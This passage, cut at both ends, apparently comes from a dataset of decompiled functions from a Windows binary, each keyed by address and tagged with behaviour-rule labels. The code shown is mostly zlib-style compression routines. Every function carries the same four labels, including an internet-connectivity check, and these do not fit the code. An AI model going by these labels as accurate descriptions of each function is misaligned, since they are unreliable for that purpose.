uint32_t var_3ch;\n    uint *var_38h;\n    uint32_t var_34h;\n    uint *var_30h;\n    uint *var_2ch;\n    uint *var_28h;\n    uint *var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uchar *var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint32_t var_8h;\n    int32_t var_4h;\n    \n    iVar3 = 0xd;\n    do {\n        iVar3 = iVar3 + -1;\n    } while (iVar3 != 0);\n    var_18h = 0x46700b;\n    var_14h = unaff_EDI;\n    var_10h = unaff_ESI;\n    var_ch = unaff_EBX;\n    var_4h = in_EAX;\n    fcn.004059cc();\n    var_1ch = 0x46757f;\n    var_20h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &fcn.00466fec::var_20h;\n    if (var_4h != 0) {\n        var_24h = *0x467590;\n        var_28h = &fcn.00466fec::var_2ch;\n        var_2ch = 0x467041;\n        var_18h = &stack0xfffffffc;\n        fcn.0040ef44(var_28h, var_24h);\n        var_2ch = 0x46704c;\n        fcn.004055c8();\n        var_2ch = *0x467590;\n        var_30h = &fcn.00466fec::var_30h;\n        var_34h = 0x46706a;\n        fcn.0040ef44(var_30h, var_2ch);\n        var_34h = 0x467075;\n        fcn.004055c8();\n        var_34h = 0x467081;\n        piVar2 = fcn.00404620();\n        var_34h = 0x46708d;\n        (**(*piVar2 + 0x90))();\n        var_34h = 0x467097;\n        (**(*piVar2 + 0x2c))();\n        var_34h = 0x4670a0;\n        (**(*piVar2 + 0x48))();\n        var_34h = 0x4670a9;\n        (**(*piVar2 + 0x48))();\n        var_34h = 0x4670b2;\n        (**(*piVar2 + 0x48))();\n        var_34h = 0x4670bb;\n        (**(*piVar2 + 0x48))();\n        do {\n            var_24h = 0x4670c7;\n            (**(*piVar2 + 0xc))();\n            var_24h = 0x4670d2;\n            fcn.00409b7c();\n            var_24h = 0x4670dd;\n            fcn.004055c8();\n            var_24h = &fcn.00466fec::var_8h;\n            var_28h = 0x4670ee;\n            fcn.00405b28();\n            var_28h = 0x4670fe;\n            fcn.00405a44();\n            var_28h = 0x46710b;\n            fcn.00405b28();\n            var_28h = 0x46711a;\n            fcn.00405a84();\n            var_28h = 0x467125;\n            fcn.00409b7c();\n            var_28h = 0x467130;\n            fcn.004055c8();\n            var_28h = &fcn.00466fec::var_ch;\n            var_2ch = 0x467141;\n            fcn.00405b28();\n            var_2ch = 0x467151;\n            fcn.00405a44();\n            var_2ch = 0x46715e;\n            fcn.00405b28();\n            var_2ch = 0x46716d;\n            fcn.00405a84();\n            var_2ch = 0x467178;\n            fcn.00409b7c();\n            var_2ch = 0x467183;\n            fcn.004055c8();\n            var_2ch = &fcn.00466fec::var_10h;\n            var_30h = 0x467194;\n            fcn.00405b28();\n            var_30h = 0x4671a4;\n            fcn.00405a44();\n            var_30h = 0x4671b1;\n            fcn.00405b28();\n            var_30h = 0x4671c0;\n            fcn.00405a84();\n            var_30h = 0x4671cb;\n            fcn.00409b7c();\n            var_30h = 0x4671d6;\n            fcn.004055c8();\n            var_30h = &fcn.00466fec::var_14h;\n            var_34h = 0x4671e7;\n            fcn.00405b28();\n            var_34h = 0x4671f7;\n            fcn.00405a44();\n            var_34h = 0x467204;\n            fcn.00405b28();\n            var_34h = 0x467213;\n            fcn.00405a84();\n            var_34h = 0x46721e;\n            fcn.00409b7c();\n            var_34h = 0x467226;\n            fcn.00409edc();\n            var_34h = 0x46722e;\n            fcn.00466cdc();\n            var_34h = 0x46723b;\n            cVar1 = fcn.00466f50();\n            if (cVar1 == '\\x01') {\n                var_34h = *0x4675e4;\n                var_38h = &fcn.00466fec::var_44h;\n                var_3ch = 0x46725d;\n                fcn.0040ef44(var_38h, var_34h);\n                var_3ch = 0x467268;\n                fcn.004055c8();\n                var_3ch = *0x4675e4;\n                var_40h = &fcn.00466fec::var_48h;\n                var_44h = 0x467286;\n                fcn.0040ef44(var_40h, var_3ch);\n                var_44h = 0x467291;\n                fcn.004055c8();\n                var_44h = *0x4675e4;\n                var_48h = &fcn.00466fec::var_4ch;\n                var_4ch = 0x4672af;\n                fcn.0040ef44(var_48h, var_44h);\n                var_4ch = 0x4672ba;\n                fcn.004055c8();\n            }\n            var_4ch = &fcn.00466fec::var_18h;\n            var_50h = 0x4672cb;\n            fcn.00405b28();\n            var_50h = 0x4672db;\n            fcn.00405a44();\n            var_50h = 0x4672e8;\n            fcn.00405b28();\n            var_50h = 0x4672f7;\n            fcn.00405a84();\n            var_50h = 0x467300;\n            (**(*piVar2 + 0x48))();\n            var_50h = 0x46730b;\n            fcn.00409b7c();\n            if (var_50h == NULL) {\n                var_50h = 0x467322;\n                cVar1 = fcn.00466f50();\n                if (cVar1 == '\\x01') {\n                    var_50h = *0x4675e4;\n                    var_54h = &fcn.00466fec::var_54h;\n                    var_58h = 0x467344;\n                    fcn.0040ef44(var_54h, var_50h);\n                    var_58h = 0x46734f;\n                    fcn.004055c8();\n                    var_58h = *0x4675e4;\n                    var_5ch = &fcn.00466fec::var_58h;\n                    var_60h = 0x46736d;\n                    fcn.0040ef44(var_5ch, var_58h);\n                    var_60h = 0x467378;\n                    fcn.004055c8();\n                    var_60h = *0x4675e4;\n                    var_64h = &fcn.00466fec::var_5ch;\n                    var_68h = 0x467396;\n                    fcn.0040ef44(var_64h, var_60h);\n                    var_68h = 0x4673a1;\n                    fcn.004055c8();\n                }\n                var_50h = 0x4673ae;\n                fcn.004055c8();\n                var_50h = &fcn.00466fec::var_1ch;\n                var_54h = 0x4673bf;\n                fcn.00405b28();\n                var_54h = 0x4673cf;\n                fcn.00405a44();\n                var_54h = 0x4673dc;\n                fcn.00405b28();\n                var_54h = 0x4673eb;\n                fcn.00405a84();\n                var_54h = *param_2;\n                var_58h = var_24h;\n                var_5ch = 0x467614;\n                var_60h = var_8h;\n                var_64h = 0x467614;\n                var_68h = var_18h;\n                fcn.004058e0(0x467620, var_20h, 0x467614, var_10h, 0x467614, var_14h, 0x467614, var_1ch, 0x467614, \n                             var_ch, 0x467614);\n            }\n            else {\n                var_50h = 0x46744b;\n                cVar1 = fcn.00466f50();\n                if (cVar1 == '\\x01') {\n                    var_50h = *0x4675e4;\n                    var_54h = &fcn.00466fec::var_60h;\n                    var_58h = 0x46746d;\n                    fcn.0040ef44(var_54h, var_50h);\n                    var_58h = 0x467478;\n                    fcn.004055c8();\n                    var_58h = *0x4675e4;\n                    var_5ch = &fcn.00466fec::var_64h;\n                    var_60h = 0x467496;\n                    fcn.0040ef44(var_5ch, var_58h);\n                    var_60h = 0x4674a1;\n                    fcn.004055c8();\n                    var_60h = *0x4675e4;\n                    var_64h = &fcn.00466fec::var_68h;\n                    var_68h = 0x4674bf;\n                    fcn.0040ef44(var_64h, var_60h);\n                    var_68h = 0x4674ca;\n                    fcn.004055c8();\n                }\n                var_50h = &fcn.00466fec::var_1ch;\n                var_54h = 0x4674db;\n                fcn.00405b28();\n                var_54h = 0x4674eb;\n                fcn.00405a44();\n                var_54h = 0x4674f8;\n                fcn.00405b28();\n                var_54h = 0x467507;\n                fcn.00405a84();\n                var_54h = *param_2;\n                var_58h = var_24h;\n                var_5ch = 0x467614;\n                var_60h = var_8h;\n                var_64h = 0x467614;\n                var_68h = var_18h;\n                fcn.004058e0(0x467620, var_20h, 0x467614, var_14h, 0x467614, var_10h, 0x467614, var_1ch, 0x467614, \n                             var_ch, 0x467614);\n            }\n            iVar3 = (**(*piVar2 + 0x14))();\n        } while (iVar3 != 0);\n    }\n    *in_FS_OFFSET = var_20h;\n    var_18h = 0x467586;\n    var_1ch = 0x46757e;\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 3428
    },
    "00467718": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00467718(uint param_1, int32_t *param_2)\n\n{\n    int32_t iVar1;\n    int32_t *in_stack_0000eff0;\n    \n    iVar1 = 0x10;\n    do {\n        iVar1 = iVar1 + -1;\n    } while (iVar1 != 0);\n    fcn.00403af4();\n    fcn.004676e4();\n    fcn.00467714();\n    iVar1 = (**(*in_stack_0000eff0 + 0xc))();\n    while (0 < iVar1) {\n        do {\n            fcn.00468240();\n            fcn.00467714();\n            (**(*param_2 + 0x10))();\n        } while (iVar1 != 0);\n        iVar1 = (**(*in_stack_0000eff0 + 0xc))();\n    }\n    do {\n        fcn.00468240();\n        iVar1 = fcn.00467714();\n        (**(*param_2 + 0x10))();\n    } while (iVar1 != 1);\n    fcn.00468504();\n    fcn.00467714();\n    return;\n}\n",
        "token_count": 259
    },
    "00467850": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00467850(uint param_1, int32_t *param_2)\n\n{\n    int32_t iVar1;\n    int32_t *in_stack_0000eff0;\n    \n    iVar1 = 0x10;\n    do {\n        iVar1 = iVar1 + -1;\n    } while (iVar1 != 0);\n    fcn.00403af4();\n    fcn.004676fc();\n    fcn.00467714();\n    iVar1 = (**(*in_stack_0000eff0 + 0xc))();\n    while (0 < iVar1) {\n        do {\n            fcn.00469b90();\n            fcn.00467714();\n            (**(*param_2 + 0x10))();\n        } while (iVar1 != 0);\n        iVar1 = (**(*in_stack_0000eff0 + 0xc))();\n    }\n    do {\n        fcn.00469b90();\n        iVar1 = fcn.00467714();\n        (**(*param_2 + 0x10))();\n    } while (iVar1 != 1);\n    fcn.0046aa4c();\n    fcn.00467714();\n    return;\n}\n",
        "token_count": 262
    },
    "00467ca0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00467ca0(int32_t arg_8h, char *arg_ch, int32_t arg_10h, int32_t arg_14h, int32_t arg_18h)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    int32_t *piVar2;\n    int32_t in_ECX;\n    int32_t in_EDX;\n    int32_t iVar3;\n    bool bVar4;\n    uint32_t var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    if (((arg_ch == NULL) || (*arg_ch != *0x492b98)) || (arg_8h != 0x38)) {\n        uVar1 = 0xfffffffa;\n    }\n    else if (in_EAX == 0) {\n        uVar1 = 0xfffffffe;\n    }\n    else {\n        *(in_EAX + 0x18) = 0;\n        if (*(in_EAX + 0x20) == 0) {\n            *(in_EAX + 0x20) = 0x4676a8;\n            *(in_EAX + 0x28) = 0;\n        }\n        if (*(in_EAX + 0x24) == 0) {\n            *(in_EAX + 0x24) = 0x4676b4;\n        }\n        var_4h = in_EDX;\n        if (in_EDX == -1) {\n            var_4h = 6;\n        }\n        bVar4 = arg_18h < 0;\n        if (bVar4) {\n            arg_18h = -arg_18h;\n        }\n        var_ch = !bVar4;\n        if (((((arg_14h < 1) || (9 < arg_14h)) || ((in_ECX != 8 || ((arg_18h < 8 || (0xf < arg_18h)))))) || (var_4h < 0)\n            ) || (((9 < var_4h || (arg_10h < 0)) || (4 < arg_10h)))) {\n            uVar1 = 0xfffffffe;\n        }\n        else {\n            if (arg_18h == 8) {\n                arg_18h = 9;\n            }\n            piVar2 = (**(in_EAX + 0x20))();\n            if (piVar2 == NULL) {\n                uVar1 = 0xfffffffc;\n            }\n            else {\n                *(in_EAX + 0x1c) = piVar2;\n                *piVar2 = in_EAX;\n                piVar2[6] = var_ch;\n                piVar2[0xb] = arg_18h;\n                iVar3 = 1 << (arg_18h & 0x1f);\n                piVar2[10] = iVar3;\n                piVar2[0xc] = iVar3 + -1;\n                piVar2[0x13] = arg_14h + 7;\n                iVar3 = 1 << (arg_14h + 7 & 0x1f);\n                piVar2[0x12] = iVar3;\n                piVar2[0x14] = iVar3 + -1;\n                piVar2[0x15] = (piVar2[0x13] + 2U) / 3;\n                iVar3 = (**(in_EAX + 0x20))();\n                piVar2[0xd] = iVar3;\n                iVar3 = (**(in_EAX + 0x20))();\n                piVar2[0xf] = iVar3;\n                iVar3 = (**(in_EAX + 0x20))();\n                piVar2[0x10] = iVar3;\n                piVar2[0x5a6] = 1 << (arg_14h + 6U & 0x1f);\n                iVar3 = (**(in_EAX + 0x20))();\n                piVar2[2] = iVar3;\n                piVar2[3] = piVar2[0x5a6] << 2;\n                if (((piVar2[0xd] == 0) || (piVar2[0xf] == 0)) || ((piVar2[0x10] == 0 || (piVar2[2] == 0)))) {\n                    piVar2[1] = 0x29a;\n                    *(in_EAX + 0x18) = *0x492b0c;\n                    fcn.00468504();\n                    uVar1 = 0xfffffffc;\n                }\n                else {\n                    piVar2[0x5a8] = iVar3 + (piVar2[0x5a6] & 0xfffffffeU);\n                    piVar2[0x5a5] = piVar2[0x5a6] * 3 + piVar2[2];\n                    piVar2[0x20] = var_4h;\n                    piVar2[0x21] = arg_10h;\n                    *(piVar2 + 8) = 8;\n                    uVar1 = fcn.00467fbc();\n                }\n            }\n        }\n    }\n    return uVar1;\n}\n",
        "token_count": 1155
    },
    "00467fbc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.00467fbc(void)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    \n    if ((((in_EAX != 0) && (*(in_EAX + 0x1c) != 0)) && (*(in_EAX + 0x20) != 0)) && (*(in_EAX + 0x24) != 0)) {\n        *(in_EAX + 0x14) = 0;\n        *(in_EAX + 8) = 0;\n        *(in_EAX + 0x18) = 0;\n        *(in_EAX + 0x2c) = 2;\n        iVar1 = *(in_EAX + 0x1c);\n        *(iVar1 + 0x14) = 0;\n        *(iVar1 + 0x10) = *(iVar1 + 8);\n        if (*(iVar1 + 0x18) < 0) {\n            *(iVar1 + 0x18) = -*(iVar1 + 0x18);\n        }\n        if (*(iVar1 + 0x18) == 0) {\n            uVar2 = 0x71;\n        }\n        else {\n            uVar2 = 0x2a;\n        }\n        *(iVar1 + 4) = uVar2;\n        uVar2 = fcn.0046797c();\n        *(in_EAX + 0x30) = uVar2;\n        *(iVar1 + 0x24) = 0;\n        fcn.0046b230();\n        fcn.0046879c();\n        return 0;\n    }\n    return 0xfffffffe;\n}\n",
        "token_count": 369
    },
    "0046814c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0046814c(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    uint in_ECX;\n    uint in_EDX;\n    \n    if ((in_EAX == 0) || (*(in_EAX + 0x1c) == 0)) {\n        uVar2 = 0xfffffffe;\n    }\n    else {\n        iVar1 = *(in_EAX + 0x1c);\n        *(iVar1 + 0x88) = in_EDX;\n        *(iVar1 + 0x7c) = in_ECX;\n        *(iVar1 + 0x8c) = arg_ch;\n        *(iVar1 + 0x78) = arg_8h;\n        uVar2 = 0;\n    }\n    return uVar2;\n}\n",
        "token_count": 192
    },
    "004681ec": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.004681ec(void)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t in_EAX;\n    uint32_t arg_10h;\n    \n    arg_10h = *(*(in_EAX + 0x1c) + 0x14);\n    if (*(in_EAX + 0x10) < arg_10h) {\n        arg_10h = *(in_EAX + 0x10);\n    }\n    if (arg_10h != 0) {\n        fcn.004676d0(*(in_EAX + 0xc), *(*(in_EAX + 0x1c) + 0x10), arg_10h);\n        *(in_EAX + 0xc) = *(in_EAX + 0xc) + arg_10h;\n        piVar1 = *(in_EAX + 0x1c) + 0x10;\n        *piVar1 = *piVar1 + arg_10h;\n        *(in_EAX + 0x14) = *(in_EAX + 0x14) + arg_10h;\n        *(in_EAX + 0x10) = *(in_EAX + 0x10) - arg_10h;\n        piVar1 = *(in_EAX + 0x1c) + 0x14;\n        *piVar1 = *piVar1 - arg_10h;\n        iVar2 = *(in_EAX + 0x1c);\n        if (*(iVar2 + 0x14) == 0) {\n            *(iVar2 + 0x10) = *(iVar2 + 8);\n        }\n    }\n    return;\n}\n",
        "token_count": 373
    },
    "00468240": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong __fastcall fcn.00468240(int32_t param_1, int32_t *param_2)\n\n{\n    int32_t **ppiVar1;\n    int32_t *piVar2;\n    int32_t *in_EAX;\n    uint uVar3;\n    int32_t iVar4;\n    \n    if ((((in_EAX == NULL) || (in_EAX[7] == 0)) || (4 < param_2)) || (param_2 < 0)) {\n        uVar3 = 0xfffffffe;\n    }\n    else {\n        ppiVar1 = in_EAX[7];\n        if (((in_EAX[3] == 0) || ((*in_EAX == 0 && (in_EAX[1] != 0)))) || ((ppiVar1[1] == 0x29a && (param_2 != 0x4)))) {\n            in_EAX[6] = *0x492b04;\n            uVar3 = 0xfffffffe;\n        }\n        else if (in_EAX[4] == 0) {\n            uVar3 = 0xfffffffb;\n            in_EAX[6] = *0x492b10;\n        }\n        else {\n            *ppiVar1 = in_EAX;\n            piVar2 = ppiVar1[9];\n            ppiVar1[9] = param_2;\n            if (ppiVar1[1] == 0x2a) {\n                ppiVar1[1] = 0x71;\n                fcn.004681c4();\n                if (ppiVar1[0x1a] != NULL) {\n                    fcn.004681c4();\n                    fcn.004681c4();\n                }\n                iVar4 = fcn.0046797c();\n                in_EAX[0xc] = iVar4;\n            }\n            if (ppiVar1[5] == NULL) {\n                if (((in_EAX[1] == 0) && (param_2 <= piVar2)) && (param_2 != 0x4)) {\n                    uVar3 = 0xfffffffb;\n                    in_EAX[6] = *0x492b10;\n                    goto code_r0x004684fb;\n                }\n            }\n            else {\n                fcn.004681ec();\n                if (in_EAX[4] == 0) {\n                    ppiVar1[9] = 0xffffffff;\n                    uVar3 = 0;\n                    goto code_r0x004684fb;\n                }\n            }\n            if ((ppiVar1[1] == 0x29a) && (in_EAX[1] != 0)) {\n                uVar3 = 0xfffffffb;\n                in_EAX[6] = *0x492b10;\n            }\n            else {\n                if (((in_EAX[1] != 0) || (ppiVar1[0x1c] != NULL)) || ((param_2 != NULL && (ppiVar1[1] != 0x29a)))) {\n                    param_1 = (**(ppiVar1[0x20] * 0xc + 0x492b28))();\n                    if ((param_1 == 2) || (param_1 == 3)) {\n                        ppiVar1[1] = 0x29a;\n                    }\n                    if ((param_1 == 0) || (param_1 == 2)) {\n                        if (in_EAX[4] == 0) {\n                            ppiVar1[9] = 0xffffffff;\n                        }\n                        uVar3 = 0;\n                        goto code_r0x004684fb;\n                    }\n                    if (param_1 == 1) {\n                        if (param_2 == 0x1) {\n                            fcn.0046c42c();\n                        }\n                        else {\n                            param_1 = 0;\n                            fcn.0046c370(0);\n                            if (param_2 == 0x3) {\n                                *(ppiVar1[0x10] + ppiVar1[0x12] * 2 + -2) = 0;\n                                fcn.004676bc(ppiVar1[0x10], 0, (ppiVar1[0x12] + -1) * 2);\n                            }\n                        }\n                        fcn.004681ec();\n                        if (in_EAX[4] == 0) {\n                            ppiVar1[9] = 0xffffffff;\n                            uVar3 = 0;\n                            goto code_r0x004684fb;\n                        }\n                    }\n                }\n                if (param_2 == 0x4) {\n                    if (ppiVar1[6] < 1) {\n                        uVar3 = 1;\n                    }\n                    else {\n                        fcn.004681c4();\n                        fcn.004681c4();\n                        fcn.004681ec();\n                        if (0 < ppiVar1[6]) {\n                            ppiVar1[6] = -ppiVar1[6];\n                        }\n                        if (ppiVar1[5] == NULL) {\n                            uVar3 = 1;\n                        }\n                        else {\n                            uVar3 = 0;\n                        }\n                    }\n                }\n                else {\n                    uVar3 = 0;\n                }\n            }\n        }\n    }\ncode_r0x004684fb:\n    return CONCAT44(param_1, uVar3);\n}\n",
        "token_count": 1168
    },
    "00468504": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.00468504(void)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    \n    if ((in_EAX == 0) || (*(in_EAX + 0x1c) == 0)) {\n        return 0xfffffffe;\n    }\n    iVar1 = *(*(in_EAX + 0x1c) + 4);\n    if (((iVar1 != 0x2a) && (((iVar1 != 0x45 && (iVar1 != 0x49)) && (iVar1 != 0x5b)))) &&\n       (((iVar1 != 0x67 && (iVar1 != 0x71)) && (iVar1 != 0x29a)))) {\n        return 0xfffffffe;\n    }\n    if (*(*(in_EAX + 0x1c) + 8) != 0) {\n        (**(in_EAX + 0x24))();\n    }\n    if (*(*(in_EAX + 0x1c) + 0x40) != 0) {\n        (**(in_EAX + 0x24))();\n    }\n    if (*(*(in_EAX + 0x1c) + 0x3c) != 0) {\n        (**(in_EAX + 0x24))();\n    }\n    if (*(*(in_EAX + 0x1c) + 0x34) != 0) {\n        (**(in_EAX + 0x24))();\n    }\n    (**(in_EAX + 0x24))();\n    *(in_EAX + 0x1c) = 0;\n    if (iVar1 == 0x71) {\n        uVar2 = 0xfffffffd;\n    }\n    else {\n        uVar2 = 0;\n    }\n    return uVar2;\n}\n",
        "token_count": 404
    },
    "00468a60": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00468a60(uint32_t param_1)\n\n{\n    uint8_t uVar1;\n    uint32_t arg_10h;\n    int32_t *in_EAX;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint16_t uVar4;\n    uint16_t *puVar5;\n    \n    arg_10h = in_EAX[10];\n    while( true ) {\n        uVar2 = in_EAX[10] + -0x106 + arg_10h;\n        if (uVar2 < in_EAX[0x1a] || uVar2 == in_EAX[0x1a]) {\n            fcn.004676d0(in_EAX[0xd], in_EAX[0xd] + arg_10h, arg_10h);\n            in_EAX[0x1b] = in_EAX[0x1b] - arg_10h;\n            in_EAX[0x1a] = in_EAX[0x1a] - arg_10h;\n            in_EAX[0x16] = in_EAX[0x16] - arg_10h;\n            iVar3 = in_EAX[0x12];\n            puVar5 = iVar3 * 2 + in_EAX[0x10];\n            do {\n                puVar5 = puVar5 + -1;\n                if (*puVar5 < arg_10h) {\n                    uVar4 = 0;\n                }\n                else {\n                    uVar4 = *puVar5 - arg_10h;\n                }\n                *puVar5 = uVar4;\n                iVar3 = iVar3 + -1;\n            } while (iVar3 != 0);\n            puVar5 = arg_10h * 2 + in_EAX[0xf];\n            uVar2 = arg_10h;\n            do {\n                puVar5 = puVar5 + -1;\n                param_1 = *puVar5;\n                if (param_1 < arg_10h) {\n                    uVar4 = 0;\n                }\n                else {\n                    uVar4 = *puVar5 - arg_10h;\n                }\n                *puVar5 = uVar4;\n                uVar2 = uVar2 - 1;\n            } while (uVar2 != 0);\n        }\n        if (*(*in_EAX + 4) == 0) break;\n        iVar3 = fcn.00468750(param_1);\n        in_EAX[0x1c] = in_EAX[0x1c] + iVar3;\n        if (2 < in_EAX[0x1c]) {\n            uVar1 = *(in_EAX[0xd] + in_EAX[0x1a]);\n            in_EAX[0x11] = uVar1;\n            in_EAX[0x11] = (uVar1 << (in_EAX[0x15] & 0x1f) ^ *(in_EAX[0xd] + 1 + in_EAX[0x1a])) & in_EAX[0x14];\n        }\n        if (0x105 < in_EAX[0x1c]) {\n            return;\n        }\n        if (*(*in_EAX + 4) == 0) {\n            return;\n        }\n    }\n    return;\n}\n",
        "token_count": 730
    },
    "004698d8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.004698d8(void)\n\n{\n    uint *puVar1;\n    uint *puVar2;\n    int32_t in_EAX;\n    \n    if ((in_EAX != 0) && (*(in_EAX + 0x1c) != 0)) {\n        puVar2 = *(in_EAX + 0x1c);\n        puVar2[7] = 0;\n        *(in_EAX + 0x14) = 0;\n        *(in_EAX + 8) = 0;\n        *(in_EAX + 0x18) = 0;\n        *(in_EAX + 0x30) = 1;\n        *puVar2 = 0;\n        puVar2[1] = 0;\n        puVar2[3] = 0;\n        puVar2[5] = 0x8000;\n        puVar2[9] = 0;\n        puVar2[10] = 0;\n        puVar2[0xb] = 0;\n        puVar2[0xd] = 0;\n        puVar1 = puVar2 + 0x14b;\n        puVar2[0xe] = 0;\n        puVar2[0x1a] = puVar1;\n        puVar2[0x13] = puVar1;\n        puVar2[0x12] = puVar1;\n        return 0;\n    }\n    return 0xfffffffe;\n}\n",
        "token_count": 323
    },
    "00469990": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00469990(int32_t arg_8h)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    int32_t iVar2;\n    char *in_ECX;\n    int32_t in_EDX;\n    int32_t var_4h;\n    \n    if (((in_ECX == NULL) || (*in_ECX != *0x4934ca)) || (arg_8h != 0x38)) {\n        uVar1 = 0xfffffffa;\n    }\n    else if (in_EAX == 0) {\n        uVar1 = 0xfffffffe;\n    }\n    else {\n        *(in_EAX + 0x18) = 0;\n        if (*(in_EAX + 0x20) == 0) {\n            *(in_EAX + 0x20) = 0x4676a8;\n            *(in_EAX + 0x28) = 0;\n        }\n        if (*(in_EAX + 0x24) == 0) {\n            *(in_EAX + 0x24) = 0x4676b4;\n        }\n        iVar2 = (**(in_EAX + 0x20))();\n        if (iVar2 == 0) {\n            uVar1 = 0xfffffffc;\n        }\n        else {\n            *(in_EAX + 0x1c) = iVar2;\n            if (in_EDX < 0) {\n                *(iVar2 + 8) = 0;\n                var_4h = -in_EDX;\n            }\n            else {\n                *(iVar2 + 8) = (in_EDX >> 4) + 1;\n                var_4h = in_EDX;\n            }\n            if ((var_4h < 8) || (0xf < var_4h)) {\n                (**(in_EAX + 0x24))();\n                uVar1 = 0xfffffffe;\n                *(in_EAX + 0x1c) = 0;\n            }\n            else {\n                *(iVar2 + 0x20) = var_4h;\n                *(iVar2 + 0x30) = 0;\n                uVar1 = fcn.004698d8();\n            }\n        }\n    }\n    return uVar1;\n}\n",
        "token_count": 498
    },
    "00469a8c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong __fastcall fcn.00469a8c(uint param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint uVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    \n    iVar1 = *(in_EAX + 0x1c);\n    if (*(iVar1 + 0x30) == 0) {\n        iVar2 = (**(in_EAX + 0x20))();\n        *(iVar1 + 0x30) = iVar2;\n        if (iVar2 == 0) {\n            uVar3 = 1;\n            goto code_r0x00469b8b;\n        }\n    }\n    if (*(iVar1 + 0x24) == 0) {\n        *(iVar1 + 0x24) = 1 << (*(iVar1 + 0x20) & 0x1f);\n        *(iVar1 + 0x2c) = 0;\n        *(iVar1 + 0x28) = 0;\n    }\n    uVar4 = param_2 - *(in_EAX + 0x10);\n    uVar5 = *(iVar1 + 0x24);\n    if (uVar4 < uVar5) {\n        uVar5 = *(iVar1 + 0x24) - *(iVar1 + 0x2c);\n        if (uVar4 < uVar5) {\n            uVar5 = uVar4;\n        }\n        fcn.004676d0(*(iVar1 + 0x30) + *(iVar1 + 0x2c), *(in_EAX + 0xc) - uVar4, uVar5);\n        iVar2 = uVar4 - uVar5;\n        if (iVar2 == 0) {\n            *(iVar1 + 0x2c) = *(iVar1 + 0x2c) + uVar5;\n            if (*(iVar1 + 0x2c) == *(iVar1 + 0x24)) {\n                *(iVar1 + 0x2c) = 0;\n            }\n            if (*(iVar1 + 